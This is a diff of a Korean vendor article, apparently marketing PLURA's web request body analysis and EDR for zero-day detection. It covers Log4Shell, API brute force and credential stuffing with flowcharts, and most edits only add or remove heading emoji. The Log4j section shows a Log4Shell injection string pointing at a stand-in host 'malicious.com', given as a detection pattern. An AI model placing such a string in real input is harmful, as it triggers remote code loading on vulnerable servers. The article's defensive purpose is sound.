@@ -8,16 +8,16 @@ PLURA의 **웹 요청 본문 로그 분석 + EDR**을 활용하면, 제로 데�
 
 ---
 
-## 📌 **제로 데이 공격 사례 및 탐지 시나리오**  
+## **제로 데이 공격 사례 및 탐지 시나리오**  
 
 ### **📌 사례 1: Log4j(Log4Shell) 취약점 공격 탐지**  
 
-#### **📌 공격 개요**  
+#### ** 공격 개요**  
 2021년 12월, **Log4j**(Log4Shell) 취약점(CVE-2021-44228)이 발견되었습니다.  
 - 공격자는 웹 애플리케이션의 **입력 필드**(검색창, 로그인 폼 등)에 **특정 문자열**(JNDI 요청 포함)을 삽입하여 원격 코드 실행(RCE, Remote Code Execution)을 수행할 수 있었습니다.  
 - WAF 및 기존 보안 솔루션이 이 패턴을 알기 전까지는, 탐지가 어려운 전형적인 제로 데이 공격이었습니다.  
 
-#### **📌 Log4j 공격 흐름 (Mermaid Flowchart)**  
+#### ** Log4j 공격 흐름 (Mermaid Flowchart)**  
 ```mermaid
 graph TD
     A[공격자] -->|JNDI Payload 포함 요청| B[취약한 웹 애플리케이션]
@@ -32,7 +32,7 @@ graph TD
     E -->|프로세스 모니터링| Z[EDR 탐지 및 실행 차단]
 ```
 
-#### **📌 PLURA 웹 요청 본문 분석 + EDR 탐지 방법**  
+#### ** PLURA 웹 요청 본문 분석 + EDR 탐지 방법**  
 ✅ **1) 웹 요청 본문 분석을 통해 악성 패턴 탐지**  
 - PLURA는 **웹 요청 본문을 실시간 분석**하여 `jndi:ldap://malicious.com/exploit`와 같은 의심스러운 패턴을 탐지 가능.  
 - 검색창, 유저 입력값, 헤더, API 요청 본문에서 **비정상적인 LDAP, RMI 호출 탐지 가능**.  
@@ -43,9 +43,9 @@ graph TD
 
 ---
 
-### **사례 2: API 취약점 악용 (Zero-Day API Attack)**  
+### **📌 사례 2: API 취약점 악용 (Zero-Day API Attack)**  
 
-#### **📌 API 공격 흐름 (Mermaid Flowchart)**  
+#### ** API 공격 흐름 (Mermaid Flowchart)**  
 ```mermaid
 graph TD
     A[공격자] -->|API Brute Force 공격| B[취약한 API 서버]
@@ -66,7 +66,7 @@ graph TD
 
 ### **📌 사례 3: 크리덴셜 스터핑 공격 탐지**  
 
-#### 📌 Credential Stuffing 공격 흐름 (Mermaid Flowchart)  
+#### Credential Stuffing 공격 흐름 (Mermaid Flowchart)  
 ```mermaid
 graph TD
     A[공격자] -->|유출된 계정 정보로 로그인 시도| B[로그인 서버]
@@ -86,7 +86,7 @@ graph TD
 
 ---
 
-### **📌 결론: PLURA 웹 요청 본문 분석 + EDR을 통한 제로 데이 탐지 및 대응**  
+### ** 결론: PLURA 웹 요청 본문 분석 + EDR을 통한 제로 데이 탐지 및 대응**  
 
 ✅ **기존 보안 시스템(WAF, SIEM, NDR, TI)은 알려진 공격 패턴만 탐지 가능하므로, 제로 데이 공격을 효과적으로 탐지하지 못함.**  
 ✅ **PLURA의 웹 요청 본문 분석은 새로운 공격 패턴을 실시간으로 분석하여, 알려지지 않은 제로 데이 공격 탐지 가능.**  
